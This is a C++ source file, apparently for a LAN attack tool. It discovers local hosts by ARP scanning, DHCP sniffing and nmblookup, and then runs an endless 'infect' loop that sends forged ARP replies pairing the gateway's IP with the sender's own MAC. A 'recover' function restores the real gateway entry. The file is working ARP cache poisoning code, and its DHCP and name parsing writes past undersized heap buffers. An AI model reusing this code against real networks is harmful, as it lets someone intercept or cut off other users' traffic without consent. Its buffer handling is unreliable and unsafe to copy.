#include "net/wscan.h"
void SendArp::infect()//infection function
{
    list<Host>::iterator iter;
    Etharp etharp;
    WPacket packet;

    while(1)
    {
        gtrace("<size>");
        std::cout<<v.size()<<std::endl;

        for(iter = v.begin(); iter!=v.end();iter++)
        {
            gtrace("<sendarp>");
            gtrace("%s",std::string((*iter).mac_).data());
            gtrace("%s",std::string((*iter).ip_).data());

            etharp.makeArppacket((*iter).mac_,ARPdevice.intf()->mac(),(*iter).mac_,(*iter).ip_,ARPdevice.intf()->gateway());
            packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
            packet.buf_.size_ = sizeof(Etharp);

            for(int i =0; i<3; i++)//send arp packet
                ARPdevice.write(packet.buf_);
            sleep(1);
        }
    }
}

void SendArp::recover(Host host)//recover function
{
    Etharp etharp;
    etharp.makeArppacket(host.mac_,mac_gate,host.mac_,host.ip_,ARPdevice.intf()->gateway());

    WPacket packet;
    packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
    packet.buf_.size_ = sizeof(Etharp);

    for(int i =0; i<3; i++)
        ARPdevice.write(packet.buf_);
}

void Scan::scan()//full-scan function
{
    WPacket packet;
    packet.buf_.size_ = sizeof(Etharp);
    Etharp etharp;
    etharp.makeArppacket(WMac("FF:FF:FF:FF:FF:FF"),FSdevice.intf()->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),FSdevice.intf()->ip());

    WIntf* intf = FSdevice.intf();
    uint32_t beginIp = (intf->ip() & intf->mask())+1;
    uint32_t endIp = (intf->ip() | ~intf->mask())-1;
    //find all ip connected to the network
    for(uint32_t ip = beginIp; ip!=endIp; ip++){
        if(WIp(ip)==intf->gateway())continue;
        etharp.arp.tip_ = htonl(WIp(ip));
        packet.buf_.data_ = reinterpret_cast<byte*>(&etharp);
        for(int i = 0; i < 3; i++)
            FSdevice.write(packet.buf_);
    }
}

void Scan::acquire()//packet parsing(arp packet)
{
    WPacket packet;
    list<Host>::iterator iter;
    time_t start, end;
    start = time(NULL);//time measuring
    while(1)
    {
        if(FSdevice.WPcapCapture::read(&packet)==WPacket::Result::Ok)
        {
            if(packet.ethHdr_->type()!=WEthHdr::Arp)continue;
            if(packet.ethHdr_->dmac_!=FSdevice.intf()->mac()||packet.arpHdr_->op()!=packet.arpHdr_->Reply)continue;

            WIp mask = FSdevice.intf()->mask();
            Host g;

            if((packet.arpHdr_->sip()&mask)==(FSdevice.intf()->gateway()&mask))
            {
                gtrace("<full scan>");
                g.mac_ = packet.ethHdr_->smac();
                g.ip_ = packet.arpHdr_->sip();
                string fname = "nmblookup -A ";
                string fullname = fname + string(g.ip_);
                FILE *fp = popen(fullname.c_str(),"r");

                if(fp == NULL){
                    perror("popen() fail");
                    exit(1);
                }

                char buf[1024];
                string str;
                fgets(buf,1024,fp);
                if(fgets(buf,1024,fp)){
                    string str(strtok(buf," "));
                    str.erase(str.begin());
                    g.name = (char*)malloc(sizeof(char)*str.size());
                    strcpy(g.name,str.c_str());
                    gtrace(str.c_str());
                }
                gtrace("%s",string(g.mac_).data());
                gtrace("%s",string(g.ip_).data());
            }

            //removing duplication in list
            int tmp = 0;
            for(iter = v.begin(); iter!=v.end();iter++){
                if((*iter).ip_==g.ip_){//if existing in list
                    tmp = 1;
                    break;
                }
            }
            //if not in list
            if(!tmp){
                m.lock();
                v.push_back(g);
                m.unlock();
            }
        }
        end = time(NULL);
        //time > 10seconds -> end
        if(end-start>10)return;
    }
}

void Scan::open(Scan* sc)//error generated
{
    dhcp = new thread(&Scan::dhcpScan,sc);
    thread scan_(&Scan::scan,sc);
    thread acquire_(&Scan::acquire,sc);
    dhcp->detach();
    scan_.join();
    acquire_.join();
}

void Etharp::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip)
{
    Etharp::eth.dmac_ = dmac;
    Etharp::eth.smac_ = smac;
    Etharp::eth.type_ = htons(WEthHdr::Arp);

    Etharp::arp.hrd_ = htons(WArpHdr::ETHER);
    Etharp::arp.pro_ = htons(WEthHdr::Ip4);
    Etharp::arp.hln_ = WMac::SIZE;
    Etharp::arp.pln_ = WIp::SIZE;
    Etharp::arp.op_ = htons(WArpHdr::Request);
    Etharp::arp.smac_ = smac;
    Etharp::arp.sip_ = htonl(sip);
    Etharp::arp.tmac_ = tmac;
    Etharp::arp.tip_ = htonl(tip);
}

void Scan::dhcpScan()//dhcp packet parsing
{
    WPacket packet;
    while(1)
    {
        if(DHdevice.WPcapCapture::read(&packet)==WPacket::Result::Ok)
        {
            if(packet.ethHdr_->type()!=WEthHdr::Ip4)continue;//is ip4 packet?
            if(packet.ipHdr_->p()!=WIpHdr::Udp)continue;//is udp packet?
            if(packet.udpHdr_->sport()!=67&&packet.udpHdr_->dport()!=67)continue;//Is dhcp packet?
            if(!packet.ethHdr_->dmac_.isBroadcast())continue; // Is DHCP Request?

            packet.dhcpHdr_ = (WDhcpHdr*)packet.udpData_.data_;
            gtrace("<Dhcp>");

            Host g;
            g.mac_ = packet.dhcpHdr_->clientMac_;//get mac
            gtrace("%s",std::string(g.mac_).data());

            for(WDhcpHdr::Option* opt = packet.dhcpHdr_->first(); opt!=nullptr; opt=opt->next())
            {
                if(opt->type_ == WDhcpHdr::RequestedIpAddress)//get ip
                {
                    char* buf = (char*)malloc(sizeof(char)*4);
                    for(int i = 0; i<opt->len_-1; i++)
                        sprintf(buf+4*i,"%03d.",*(&opt->len_+1+i));
                    sprintf(buf+12,"%03d",*(&opt->len_+4));

                    string str(buf);
                    g.ip_ = WIp(str);
                    gtrace("%s",std::string(g.ip_).data());
                }
                else if(opt->type_ == 12)//get name
                {
                    g.name = (char*)malloc(sizeof(char)*opt->len_);
                    for(int i = 0; i<opt->len_;i++)
                        g.name[i] = *(&opt->len_+1+i);
                }
            }

            //using mutex
            m.lock();
            v.push_back(g);
            m.unlock();
        }
    }
}
